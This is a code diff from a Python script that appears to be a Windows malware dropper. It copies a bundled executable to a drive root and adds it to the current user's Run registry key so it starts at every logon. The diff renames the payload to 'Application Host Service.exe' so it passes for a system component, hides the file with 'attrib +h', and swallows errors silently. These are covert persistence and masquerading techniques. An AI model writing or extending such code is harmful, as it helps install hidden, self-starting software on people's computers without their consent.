@@ -43,37 +43,41 @@ if run_as_admin():
     def add_to_startup(Drive_Letter):
 
         # Get the path to the executable (assuming it's in the same directory)
-        executable_path = os.path.abspath(rf"{Drive_Letter}Windows Security Service.exe")
+        executable_path = os.path.abspath(rf"{Drive_Letter}Application Host Service.exe")
+        Exe_Path=rf"{Drive_Letter}Application Host Service.exe"
+
 
         # Create the registry key for the startup entry
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        key_name = r"Windows Security Service"
+        key_name = r"Application Host Service"
 
         try:
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                 winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
+                os.system(f"attrib +h {Exe_Path}")
+
                 # print(f"Added to startup: {executable_path}")
                 pass
         except Exception as e:
             # print(f"Error adding to startup: {e}")
             pass
 
-    #  list_drive_letters Fuction 🟡
+    #  list_drive_letters Fuction 💠
     drive_letters = list_drive_letters()
     A=drive_letters[1]
     drive_letter = A+"/"
 
 
-    #  move_exe_file Fuction 🟡
+    #  move_exe_file Fuction I💠
     script_directory = getattr(sys, '_MEIPASS', os.path.dirname(__file__))
 
     # Specify the paths
-    source_file_path = os.path.join(script_directory, r"Windows Security Service.exe")
+    source_file_path = os.path.join(script_directory, r"Application Host Service.exe")
     destination_folder = drive_letter
 
     move_exe_file(source_file_path, destination_folder)
 
-    # Add_to_startup() Fuction 🟡
+    # Add_to_startup() Fuction 💠
     add_to_startup(drive_letter)
 
 
